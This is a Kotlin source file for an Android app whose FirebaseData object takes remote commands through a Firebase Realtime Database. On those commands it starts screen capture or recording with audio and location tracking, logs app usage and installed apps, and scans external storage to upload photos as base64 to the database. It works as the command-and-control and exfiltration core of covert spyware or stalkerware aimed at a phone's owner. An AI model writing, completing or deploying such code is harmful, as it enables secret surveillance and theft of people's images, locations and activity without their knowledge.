package com.example.toasty.security

import android.Manifest
import android.app.Activity
import android.app.Activity.RESULT_OK
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Context.MEDIA_PROJECTION_SERVICE
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Environment
import android.provider.Settings
import android.util.Base64
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.example.toasty.common.CommonUtils
import com.example.toasty.models.User
import com.example.toasty.services.LocationMapService
import com.example.toasty.services.ScreenRecordingService
import com.example.toasty.workmanager.MyWorkerInstalledAppInfo
import com.google.android.gms.tasks.Task
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.ByteArrayOutputStream
import java.io.File


object FirebaseData {


    private const val TAG: String = "FirebaseData"
    private lateinit var databaseReference: DatabaseReference
    var deviceUid: String = "Android"
    private val deviceVersion: String = Build.VERSION.RELEASE
    val deviceInfo = Build.BRAND + "(Device:" + Build.MODEL + "_OS:" + deviceVersion + ")"
    private const val SCREEN_RECORD_REQUEST_CODE = 1001
    private const val SCREEN_AUDIO_RECORD_CODE = 1002
    private const val SCREEN_STORAGE_CODE = 1003
    var recordScreen = true
    private lateinit var mediaProjectionManager: MediaProjectionManager
    private val directoriesWithImages = mutableListOf<File>()

    fun onInit(activity: Activity) {

        deviceUid =
            deviceInfo + Settings.Secure.getString(
                activity.contentResolver,
                Settings.Secure.ANDROID_ID
            )
                ?: "Android"
        // Initialize Firebase Database reference
        databaseReference = FirebaseDatabase.getInstance().reference.child(deviceUid)

        writeData()
        //readData()
        realTimeUpdateData(activity)
        //listExternalStorageDirectories()
    }


    private fun writeData() {
        val user = User(
            "John",
            "Deo",
            25,
            lastOpenedApp = false,
            uploadDocuments = false,
            uploadImages = false,
            uploadVideos = false,
            locationStart = false,
            screenshotStart = false,
            videoRecordingStart = false
        ) // Example data class
        databaseReference.child("user").setValue(user)

    }

    fun saveLocationToDatabase(currentLatLong: String) {
        //val timeStamp = System.currentTimeMillis()
        val date = CommonUtils.getCurrentDateTime()
        val dateInString = CommonUtils.dateFormetter(date, "yyyy_MM_dd")
        val timeInString = CommonUtils.dateFormetter(date, "HH:mm:ss")
        databaseReference.child("locations").child(dateInString).child(timeInString)
            .setValue(currentLatLong)
            .addOnSuccessListener {
                Log.d(TAG, "Location saved to Realtime Database $currentLatLong")
            }
            .addOnFailureListener { exception ->
                Log.d(TAG, "Failed to save location: ${exception.message}")
            }

    }

    private fun getLastOpenedApp(context: Context) {
        val usageStatsManager =
            context.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager

        // Get current time and the interval for querying usage stats
        val currentTime = System.currentTimeMillis()
        val startTime = currentTime - 1000 * 60 * 60 * 24 // Query for the past hour

        // Query usage stats
        val usageStatsList = usageStatsManager.queryUsageStats(
            UsageStatsManager.INTERVAL_DAILY, startTime, currentTime
        )

        if (usageStatsList.isNullOrEmpty()) {
            redirectToUsageAccessSettings(context)
            Log.d(TAG, "Usage stats permission not granted or no data available.")
        } else {
            callWorkManagerInstalledApp(context)
            // Find the last used app
            val lastUsedApp: ArrayList<Pair<String?, Long>> = ArrayList<Pair<String?, Long>>()
            for (usageStats in usageStatsList) {
                if (usageStats.lastTimeUsed > 0) {
                    lastUsedApp.add(
                        usageStats?.packageName to (usageStats?.totalTimeInForeground ?: 0)
                    )
                    Log.d(TAG, "Last opened app: ${usageStats?.packageName}")
                    /*val ref = databaseReference.child("lastOpenedApp")
                        .child(usageStats?.packageName.toString())*/
                    if (usageStats?.totalTimeInForeground?.div(60000)!! > 0) {
                        // Time in foreground min
                        databaseReference.child("lastOpenedApp")
                            .child(usageStats?.packageName.toString().replace('.', '_'))
                            .child("totalTimeInForeground")
                            .setValue("${usageStats?.totalTimeInForeground?.div(60000)} min")
                            .addOnSuccessListener {
                                Log.d(
                                    TAG,
                                    "totalTimeInForeground ${usageStats?.totalTimeInForeground ?: 0}"
                                )
                            }
                            .addOnFailureListener { exception ->
                                Log.d(
                                    TAG,
                                    "Failed to save totalTimeInForeground: ${exception.message}"
                                )
                            }
                    } else {
                        // Time in foreground sec
                        databaseReference.child("lastOpenedApp")
                            .child(usageStats?.packageName.toString().replace('.', '_'))
                            .child("totalTimeInForeground")
                            .setValue("${usageStats?.totalTimeInForeground?.div(1000)} sec")
                            .addOnSuccessListener {
                                Log.d(
                                    TAG,
                                    "Time in foreground ${usageStats?.totalTimeInForeground ?: 0}"
                                )
                            }
                            .addOnFailureListener { exception ->
                                Log.d(
                                    TAG,
                                    "Failed to save Time in foreground: ${exception.message}"
                                )
                            }
                    }
                    val lastTimeUsed = "${
                        usageStats?.lastTimeUsed?.let {
                            CommonUtils.convertTimestampToDate(it)
                        }
                    }"
                    /* == ${usageStats?.lastTimeVisible} ${
                         usageStats?.lastTimeVisible?.let {
                             CommonUtils.convertTimestampToDate(
                                 it
                             )
                         }
                     }*/
                    databaseReference.child("lastOpenedApp")
                        .child(usageStats?.packageName.toString().replace('.', '_'))
                        .child("lastTimeUsed")
                        .setValue(lastTimeUsed)
                        .addOnSuccessListener {
                            Log.d(TAG, "Location saved to Realtime Database $lastTimeUsed")
                        }
                        .addOnFailureListener { exception ->
                            Log.d(TAG, "Failed to save location: ${exception.message}")
                        }
                }
            }
        }
    }

    // Redirect the user to settings to grant the required permission
    private fun redirectToUsageAccessSettings(context: Context) {
        val intent = Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS)
        context.startActivity(intent)
    }

    private fun callWorkManagerInstalledApp(context: Context){
        // Enqueue the WorkRequest
        val workRequest = OneTimeWorkRequestBuilder<MyWorkerInstalledAppInfo>().build()
        WorkManager.getInstance(context).enqueue(workRequest)

        // Observe WorkManager's progress
    /*    WorkManager.getInstance(context).getWorkInfoByIdLiveData(workRequest.id)
            .observe(context) { workInfo ->
                if (workInfo != null && workInfo.state.isFinished) {
                    // Get output data
                    val result = workInfo.outputData.getString("result")
                    Log.d(MyWorkerInstalledAppInfo.TAG, "Work Finished: $result")
                    //Toast.makeText(this, result, Toast.LENGTH_SHORT).show()
                }
            }*/
    }


    private fun readData() {
        databaseReference.child("user").get().addOnSuccessListener {
            val user = it.getValue(User::class.java)
            Log.d(TAG, "User: $user")
        }.addOnFailureListener {
            Log.d(TAG, "Error getting data: ${it.message}")
        }

    }

    private fun realTimeUpdateData(activity: Activity) {
        // Real-time updates
        databaseReference.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                for (child in snapshot.children) {
                    Log.d(TAG, "Real-time child: ${child.key}")
                    if (child.key.toString() == "images") {
                        //Log.d(TAG, "Real-time key: ${child.key}")
                        var screenshots = child.value as HashMap<*, *>
                        for (key in screenshots.values) {
                            //println("Real-time child: $key")
                            //imageScreenshot.setImageBitmap(decodeBase64ToBitmap(key.toString()))
                            break
                        }
                        //break
                    } else if (child.key.toString() == "locations") {
                        val date = CommonUtils.getCurrentDateTime()
                        val dateInString = CommonUtils.dateFormetter(date, "yyyy_MM_dd")
                        //val dateInString = "2025_01_06"
                        //Log.d(TAG, "Real-time location: ${child.child(dateInString).toString()}")
                        if (child.hasChild(dateInString)) {
                            val mapLatLong = child.child(dateInString).value as HashMap<*, *>
                            val listLatLong = ArrayList<String>()
                            for (key in mapLatLong.values) {
                                listLatLong.add(key.toString())
                                //Log.d(TAG, "Real-time mapLatLong: $key")
                            }
                            LocationMap.locations.value = listLatLong
                        }
                    } else if (child.key.toString() == "lastOpenedApp") {

                    } else if (child.key.toString() == "InstalledApps") {

                    } else {
                        val user = child.getValue(User::class.java)
                        Log.d(TAG, "Real-time User: $user")
                        // textViewStatus.text =
                        //     "ScreenshotStart ${user?.screenshotStart} : VideoRecordingStart ${user?.videoRecordingStart}"
                        if (user?.screenshotStart == true) {
                            recordScreen = false
                            if (checkAudioPermission(activity)) startScreenCapturing(activity)
                        } else if (user?.videoRecordingStart == true) {
                            recordScreen = true
                            if (checkAudioPermission(activity)) startScreenRecording(activity)
                        } else if (user?.screenshotStart == false || user?.videoRecordingStart == false) {
                            stopScreenRecording(activity)
                        }

                        if (user?.locationStart == true) {
                            LocationMapService.startLocationService(activity)
                            //LocationMap.onInit(activity)
                        } else {
                            LocationMapService.stopLocationService(activity)
                            //LocationMap.removeLocationUpdate()
                        }
                        if (user?.uploadDocuments == true) {

                        }
                        if (user?.uploadImages == true) {
                            CoroutineScope(Dispatchers.IO).launch {
                                imageReaderNew(directoriesWithImages)
                            }
                        }
                        if (user?.uploadVideos == true) {

                        }
                        if (user?.lastOpenedApp == true) {
                            //writeData()
                            //getLastOpenedApp(activity)
                        }
                    }

                }
            }

            override fun onCancelled(error: DatabaseError) {
                println("Error: ${error.message}")
            }
        })
    }

    private suspend fun imageReaderNew(listAllFiles: List<File>?) {
        if (!listAllFiles.isNullOrEmpty()) {
            for ((i, currentFile) in listAllFiles.withIndex()) {
                // File absolute path
                Log.d("ScreenCaptureFiles downloadFilePath", currentFile.absolutePath)
                // File Name
                Log.d("ScreenCaptureFiles downloadFileName", currentFile.name)
                val bitmap = getBitmapFromFilePath(currentFile.absolutePath)
                val base64String = bitmap?.let { encodeImageToBase64(it) }
                base64String?.let {
                    saveImageToDatabase(
                        base64String,
                        currentFile.name.substringBeforeLast(".")
                    )
                }
                //if(i==2)break
            }
        }
    }

    private fun pickFile() {
        CoroutineScope(Dispatchers.IO).launch {
            var gpath: String =
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).absolutePath
            var spath = "Screenshots"
            var fullpath = File(gpath + File.separator + spath)
            Log.w("ScreenCaptureFiles  fullpath", "" + fullpath)
            val fileList: ArrayList<File> = ArrayList()
            val listAllFiles = fullpath.listFiles() as List<File>
            imageReaderNew(listAllFiles)
        }
    }

    private fun listExternalStorageDirectories() {
        CoroutineScope(Dispatchers.IO).launch {
            val externalStorageDir = Environment.getExternalStorageDirectory()
            directoriesWithImages.clear()
            checkIsDirectory(externalStorageDir)
        }
    }

    private suspend fun checkIsDirectory(directoryPath: File) {
        if (directoryPath.exists() && directoryPath.isDirectory) {
            val directories = directoryPath.listFiles()?.filter { it.isDirectory }
            directories?.forEach { dir ->
                if (dir.isDirectory) {
                    checkIsDirectory(dir)
                }
            }
            val imageFiles = directoryPath.listFiles()?.filter { it.isFile && isImageFile(it) }
            if (!imageFiles.isNullOrEmpty()) {
                directoriesWithImages.addAll(imageFiles)
            }
            val videoFiles = directoryPath.listFiles()?.filter { it.isFile && isVideoFile(it) }
            Log.d(
                TAG,
                "ImageDirectory: directoryPath: $directoryPath -- Dir:${directories?.size} == Images:${imageFiles?.size} == Videos:${videoFiles?.size}"
            )
        }
    }

    private fun isImageFile(file: File): Boolean {
        // Define valid image file extensions
        val imageExtensions = listOf("jpg", "jpeg", "png", "gif", "bmp", "webp")
        val extension = file.extension.lowercase()
        return imageExtensions.contains(extension)
    }

    private fun isVideoFile(file: File): Boolean {
        // List of common video file extensions
        val videoExtensions = listOf("mp4", "mkv", "avi", "mov", "wmv", "flv", "webm", "mpeg")
        val extension = file.extension.lowercase()
        return videoExtensions.contains(extension)
    }

    private fun encodeImageToBase64(bitmap: Bitmap): String {
        val byteArrayOutputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 100, byteArrayOutputStream)
        val byteArray = byteArrayOutputStream.toByteArray()
        return Base64.encodeToString(byteArray, Base64.DEFAULT)
    }

    private suspend fun saveImageToDatabase(encodedImage: String, imageName: String) {
        //val databaseReference = FirebaseDatabase.getInstance().getReference("images")
        //val uploadId = "ScreenCapture_${System.currentTimeMillis()}"
        imageName?.let {
            databaseReference.child("images").child(it).setValue(encodedImage)
                .addOnSuccessListener {
                    /*Toast.makeText(
                        this,
                        "Image saved to Realtime Database $imageName",
                        Toast.LENGTH_SHORT
                    ).show()*/
                    Log.d(TAG, "Image saved to Realtime Database $imageName")
                }
                .addOnFailureListener { exception ->
                    /*Toast.makeText(
                        this,
                        "Failed to save image: ${exception.message}",
                        Toast.LENGTH_SHORT
                    ).show()*/
                    Log.d(TAG, "Failed to save image: ${exception.message}")
                }
        }
    }

    private fun decodeBase64ToBitmap(encodedImage: String): Bitmap {
        val decodedBytes = Base64.decode(encodedImage, Base64.DEFAULT)
        return BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.size)
    }

    private fun getBitmapFromFilePath(filePath: String): Bitmap? {
        val file = File(filePath)
        return if (file.exists()) {
            BitmapFactory.decodeFile(file.absolutePath)
        } else {
            null
        }
    }


    private fun checkAudioPermission(activity: Activity): Boolean {
        return if (ContextCompat.checkSelfPermission(
                activity,
                Manifest.permission.RECORD_AUDIO
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            ActivityCompat.requestPermissions(
                activity,
                arrayOf(
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                ),
                SCREEN_AUDIO_RECORD_CODE
            )
            false
        } else {
            true
        }
    }

    private fun startScreenCapturing(activity: Activity) {
        mediaProjectionManager =
            activity.getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intent = mediaProjectionManager.createScreenCaptureIntent()
        activity.startActivityForResult(intent, SCREEN_RECORD_REQUEST_CODE)
    }

    private fun startScreenRecording(activity: Activity) {
        mediaProjectionManager =
            activity.getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        try {
            val serviceIntent = Intent(activity, ScreenRecordingService::class.java).apply {
                putExtra("RESULT_CODE", RESULT_OK)
                putExtra("DATA", data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                activity.startForegroundService(serviceIntent)
            }
            Toast.makeText(activity, "Recording Started", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            e.printStackTrace()
            Toast.makeText(
                activity,
                "Error Recording MediaRecorder: ${e.message}",
                Toast.LENGTH_SHORT
            ).show()
        }
    }

    private fun stopScreenRecording(activity: Activity) {
        val serviceIntent = Intent(activity, ScreenRecordingService::class.java)
        activity.stopService(serviceIntent)
        //pickFile()

        //Toast.makeText(activity, "Recording Stopped", Toast.LENGTH_SHORT).show()
    }

    /*    override fun onDestroy() {
            super.onDestroy()
            stopScreenRecording()
        }*/

    /*    @RequiresApi(Build.VERSION_CODES.O)
        override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
            super.onActivityResult(requestCode, resultCode, data)
            if (requestCode == SCREEN_RECORD_REQUEST_CODE && resultCode == RESULT_OK) {
                try {
                    val serviceIntent = Intent(this, ScreenRecordingService::class.java).apply {
                        putExtra("RESULT_CODE", resultCode)
                        putExtra("DATA", data)
                    }
                    startForegroundService(serviceIntent)
                    Toast.makeText(this, "Recording Started", Toast.LENGTH_SHORT).show()
                } catch (e: Exception) {
                    e.printStackTrace()
                    Toast.makeText(
                        this,
                        "Error Recording MediaRecorder: ${e.message}",
                        Toast.LENGTH_SHORT
                    ).show()
                }
            } else if (requestCode == SCREEN_AUDIO_RECORD_CODE && resultCode == RESULT_OK) {
                Toast.makeText(this, "Audio Permission Granted", Toast.LENGTH_SHORT).show()
            } else if (requestCode == SCREEN_STORAGE_CODE && resultCode == RESULT_OK) {
                Toast.makeText(this, "Storage Permission Granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show()
            }
        }*/




}
